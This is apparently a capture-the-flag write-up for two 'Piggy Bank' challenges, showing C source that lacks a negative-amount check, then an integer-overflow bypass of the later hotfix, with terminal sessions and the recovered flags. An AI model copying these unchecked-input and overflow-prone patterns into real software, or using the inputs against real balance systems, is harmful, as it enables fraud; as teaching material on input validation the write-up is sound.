# Piggy_Bank

> Time to save your angbao money! $_$
>
> nc chals.whitehacks.ctf.sg 20101
>
> Solve this challenge to unlock Piggy_Bank_Revenge!

After connecting to the shell, we are greeted with the following screen:

```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
```

When we attempt to buy the flag, it prints:

```
[-] Error: You cannot buy the flag. Come back when you have $31337.00
```

At this point, we should look at the nicely attached source code and search for vulnerabilities.

```c++
void deposit(){
	int amount;
	printf("How much would you like to DEPOSIT?\n");
	printf("> $");
	scanf("%d", &amount);
	// Check if wallet contains enough
	if(amount * 100 < user_cents){
		// Make deposit if valid value
		user_cents  -= amount * 100;
		piggy_cents += amount * 100;
	}
	else{
		// Insufficient funds in wallet
		printf("[-] Error: You do not have sufficient funds to DEPOSIT\n");
	}
}

void flag(){
	// Buy flag for $31337.00
	if(user_cents > 3133700){
		user_cents -= 31337000;
		system("cat flag");
		exit(0);
	}
	else{
		printf("[-] Error: You cannot buy the flag. Come back when you have $31337.00\n");
	}
}
```

Notice that `deposit()` does not check for negative values. If we attempt to deposit a negative value, we are able to satisfy `user_cents > 3133700` in `flag()`.

```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 1

How much would you like to DEPOSIT?
> $-100000

Piggy Bank value: $-98663.00
Wallet value:     $100100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
```

Now, we can buy the flag.

`WH2021{N0w_the_p1ggy_is_wORS3_than_empty_:'(}`

# Piggy_Bank_Revenge

> Seems there was an issue with the previous implementation. I've introduced a HOTFIX that should prevent any further vulnerabilities. I've achieved an unhackable piggy bank now for sure.
>
> nc chals.whitehacks.ctf.sg 20201
>
> This will require a bit more knowledge about programming than Piggy Bank. Give it a try and learn something new(?)"

If we compare the source code, we notice that they added a check for negative values for both `deposit()` and `withdraw()` functions.

```diff
void deposit(){
	int amount;
	printf("How much would you like to DEPOSIT?\n");
	printf("> $");
	scanf("%d", &amount);
+	// HOTFIX
+	if(amount < 0){
+		printf("[-] Error: No negative values!\n");
+		return;
+	}
	// Check if wallet contains enough
	if(amount * 100 < user_cents){
		// Make deposit if valid value
		user_cents  -= amount * 100;
		piggy_cents += amount * 100;
	}
	else{
		// Insufficient funds in wallet
		printf("[-] Error: You do not have sufficient funds to DEPOSIT\n");
	}
}
```

However, we can still take advantage of [integer overflow](https://en.wikipedia.org/wiki/Integer_overflow) in C to create a negative integer using a very large positive integer. This works as integers are stored as their [two's complement](https://en.wikipedia.org/wiki/Two%27s_complement) in binary under the hood.

```
Piggy Bank value: $1337.00
Wallet value:     $100.00

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice: 1

How much would you like to DEPOSIT?
> $200000000

Piggy Bank value: $-14747027.-80
Wallet value:     $14748464.80

1) Deposit INTO Piggy
2) Withdraw FROM Piggy
3) Buy flag
4) Exit

Your choice:
```

Now, we can buy the flag.

`WH2021{(Don't)Try_th1s_0n_youR_B4nk!}`
